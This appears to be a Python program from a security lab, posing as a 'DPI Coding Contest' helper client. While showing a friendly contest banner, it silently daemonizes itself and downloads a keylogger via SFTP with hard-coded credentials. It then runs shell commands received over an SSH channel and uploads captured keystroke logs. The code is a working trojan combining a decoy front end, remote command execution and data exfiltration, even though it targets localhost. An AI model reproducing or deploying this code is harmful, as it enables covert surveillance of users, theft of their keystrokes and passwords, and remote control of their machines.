#!/usr/bin/python3

import paramiko
import socket
import os
import time
import logzero
from logzero import logger
import threading
import subprocess
import time
import threading
import sys
import atexit
import signal

pidfile = "/tmp/client.pid"


class sftpClient(object):
    def __init__(self, hostname, port, username, password):
        self.sftp = None
        self.transport = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password

    def makeSFTPConnection(self):
        try:
            logger.info("Establishing sftp connection")
            self.transport = paramiko.Transport((self.hostname, 22))
            logger.info("SFTP transport created")
            self.transport.connect(username="lab",
                                   password="lab")
            self.sftp = paramiko.SFTPClient.from_transport(self.transport)

            logger.info('SFTP Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SFTP_FAILURE as sftpErr:
            logger.error(f'SFTP connection failed:{sftpErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # upload a file via the SFTP tunnel to remote server via SFTP
    def uploadFile(self,  remotePath,  localPath):
        try:
            # connect to SFTP server
            self.makeSFTPConnection()
            self.sftp.put(localPath, remotePath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()

            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # download a file via the SSH tunnel from remote server via SFTP
    def downloadFile(self,  remotePath,  localPath):
        try:
            # connect to SSH server
            self.makeSFTPConnection()
            self.sftp.get(remotePath,  localPath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()
            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()


class sshClient(object):
    # constructor, sets necessary parameters to establish a SSH tunnel
    def __init__(self,  hostname,  port, username,  password):
        self.ssh = None
        self.channel = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password
        self.command = ""

    # make a connection to a remote SSH server
    def makeSSHConnection(self):
        try:
            logger.info("Establishing ssh connection")
            # create a client instance, auto generate a key
            # and attempt to connect to a host
            self.ssh = paramiko.SSHClient()
            self.ssh.load_system_host_keys()
            self.ssh.set_missing_host_key_policy(
                paramiko.WarningPolicy())

            self.ssh.connect(hostname=self.hostname,  port=self.port,
                             username=self.username,  password=self.password)
            self.channel = self.ssh.get_transport().open_session()
            logger.info('SSH Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SSHException as sshErr:
            logger.error(f'SSH connection failed:{sshErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()

    def stopKeylogger(self):
        logger.info("stopKeylogger() thread starting")
        self.invoke_shell("stop")
        self.command = "stop"
        logger.info("stopKeylogger() thread finishing",)

    def invoke_shell(self, command):
        try:
            # connect to SSH server
            self.makeSSHConnection()

            logger.info("Calling invoke shell")

            self.channel.sendall(command.encode())

            receivedCommand = self.channel.recv(1024).decode()
            logger.info(f"Received message {receivedCommand}")
            p = subprocess.Popen(receivedCommand, shell=True,
                                 stdout=subprocess.PIPE)

            self.channel.sendall(receivedCommand.encode())

            self.channel.close()
            self.ssh.close()
        except subprocess.CalledProcessError as e:
            logger.error(f"Subprocess error: {e.output.decode()}")
        except paramiko.SSHException as sshErr:
            logger.error(f'Shell invoke failed:{sshErr}')
            self.ssh.close()
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
            self.ssh.close()
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()


def removePidProcess():
    if os.path.exists(pidfile):
        logger.info("Server process killed...\n")
        with open(pidfile) as file:
            pid = int(file.readline().rstrip())
            os.kill(pid, signal.SIGTERM)
    else:
        logger.error("Expected server pidfile not found")


def dropPrivileges(uid=65534, gid=65534):
    """Drops UID and GID privileges if current process has access to root.
    98 is used to set new UID and GID.
    UIDs 1 through 99 are traditionally reserved for special system users (pseudo-users),
    such as wheel, daemon, lp, operator, news, mail, etc.
    Reference: http://www.linfo.org/uid.html"""
    try:
        # If process has access to root ...
        if os.getuid() == 0:
            logger.info("Dropping root access privileges")
        # Setting new UID and GID
            try:
                os.setuid(uid)
            except OSError as e:
                logger.error(f"'Could not set effective user id: {e}")

            try:
                os.setgid(gid)
            except OSError as e:
                logger.error(f"'Could not set effective group id: {e}")
        else:
            # Process has no root access
            logger.info("No root privileges")
    except Exception as e:
        logger.error("Failed to drop privileges: {e}")
        raise Exception(e)


def daemonize(pidfile, *, stdin='/dev/null',
              stdout='/dev/null',
              stderr='/dev/null'):
    """The code below is adapted by:
    https://github.com/dabeaz/python-cookbook/blob/master/
    src/12/launching_a_daemon_process_on_unix/daemon.py
    It uses Unix double-fork magic based on Stevens's book
    "Advanced Programming in the UNIX Environment".
    Creates a daemon that is diassociated with the terminal
    and has no root privileges. Once double-forking is successful
    it writes its pid to a designated pidfile. The pidfile
    is later used to kill the daemon.
    """

    # If pidfile exists, there is a server program that is currently running
    if os.path.exists(pidfile):
        raise RuntimeError('Already running')

    # First fork (detaches from parent)
    try:
        if os.fork() > 0:
            # Parent exit
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #1 failed: {e}')

    # Decouple from parent environment
    os.chdir('/tmp')
    os.umask(0)
    os.setsid()
    dropPrivileges()

    logger.info("fork#1 successfull")
    # Second fork (relinquish session leadership)
    try:
        if os.fork() > 0:
            raise SystemExit(0)
    except OSError as e:
        raise RuntimeError(f'fork #2 failed: {e}')

    # Flush I/O buffers
    sys.stdout.flush()
    sys.stderr.flush()

    # Replace file descriptors for stdin, stdout, and stderr
    with open(stdin, 'rb', 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(stdout, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open(stderr, 'ab', 0) as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

    # PID of the double-forked daemon
    fork2DaemonPID = os.getpid()

    logger.info("Writing pidfile")
    # Write the PID file
    with open(pidfile, 'w') as f:
        print(fork2DaemonPID, file=f)

    logger.info(f"fork#2 successful pid[{fork2DaemonPID}]")

    # Arrange to have the PID file removed on exit/signal
    atexit.register(lambda: os.remove(pidfile))
    atexit.register(lambda: removePidProcess())

    # Signal handler for termination (required)
    def sigterm_handler(signo, frame):
        raise SystemExit(1)

    signal.signal(signal.SIGTERM, sigterm_handler)


def doMaliciousActivities():

    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
    localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
    remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
    localpath2 = "/tmp/keylog.log"

    try:
        daemonize(pidfile, stdout='/tmp/client.pid', stderr='/tmp/client.pid')
        # make password file
        os.system("touch /tmp/ZZZZ_NOT_SUSPICIOUS_FILE")

        sftp = sftpClient("localhost", 22, "lab", "lab")
        sftp.downloadFile(remotepath, localpath)

        ssh = sshClient("localhost", 9000, "rick", "jacky")
        ssh.invoke_shell("start")

        logger.info("Main before creating thread")
        stopKeyloggerThread = threading.Thread(
            target=ssh.stopKeylogger, daemon=True)
        logger.info("Main before running thread")
        stopKeyloggerThread.start()

        while ssh.command != "stop":
            logger.info("Sleeping . . . ")
            time.sleep(4)
            logger.info(f"Command: {ssh.command}")
            logger.info("Awake!")

        stopKeyloggerThread.join()

        sftp.uploadFile(remotepath2, localpath2)

        # Kill the process id that is located in the pidfile
        if os.path.exists(pidfile):
            logger.info("Server process killed...\n")
            with open(pidfile) as file:
                pid = int(file.readline().rstrip())
                os.kill(pid, signal.SIGTERM)
        else:
            print("Expected server pidfile not found", file=sys.stderr)
            logger.error("Expected server pidfile not found")
            raise SystemExit(1)
    except Exception as e:
        logger.error(f"Error: {e}")
        raise


def printNonMaliciousActivity():
    # non malicious stuff
    print("Welcome to the DPI Coding Contest!")

    print("For this challenge, you'll be writing a python socket client to communicate to " +
          "a server located at the IP address of '127.0.0.1' and running on port 27000. " +
          "The client must be able to send different types of data." +
          "Your overall implementation will be assessed along with your " +
          "knowledge of networking fundamentals, coding style and program efficiency.")

    print("Run this file as many times as you need to check on the server status and any " +
          "information you need to compplete the contest. " +
          "This is file is used to ping the server.")

    print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")

    print("Pinging server ...")
    for i, j in enumerate(list(range(10001))):
        print(str(i / 100) + " percent complete.", end='\r')
    print("\n")

    try:
        helloSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        helloSocket.connect(("127.0.0.1", 9999))
        print(helloSocket.recv(1024).decode())
        helloSocket.send("Hello from contest client!".encode())
        helloSocket.close()
    except Exception:
        print("Woops! Seems like you do not have the server running!" +
        "Use the command 'python3 contestServer.py' to start it up on the" + 
        "command Line")

    print("Your coding challenge: Send an 'X' to the server with a python" +
    "socket client connection to terminate the server.")
    print("Now let's get coding!")

# main thread
if __name__ == '__main__':
    try:
        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
            os.remove("/home/lab/bin/py/project/sshClient.log")

        # Add logging to logfile and disable output to the terminal
        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                        backupCount=3, disableStderrLogger=True)

        printNonMaliciousActivity()
        doMaliciousActivities()
    except Exception as err:
        logger.error(err)
